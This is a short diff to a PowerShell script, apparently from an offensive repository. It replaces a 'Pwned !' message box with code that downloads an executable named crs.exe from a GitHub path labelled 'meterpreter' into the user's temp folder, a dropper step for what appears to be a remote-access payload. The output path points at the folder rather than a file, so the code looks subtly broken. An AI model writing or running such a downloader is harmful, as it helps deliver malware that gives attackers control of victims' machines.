@@ -1,2 +1,3 @@
-[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
-[System.Windows.Forms.MessageBox]::Show("Pwned ! @tfairane : take a look at my GitHub Vectors.") 
+$url = "https://github.com/tfairane/Vectors/blob/master/meterpreter/crs.exe"
+$output=$env:temp
+(New-Object System.Net.WebClient).DownloadFile($url, $output)
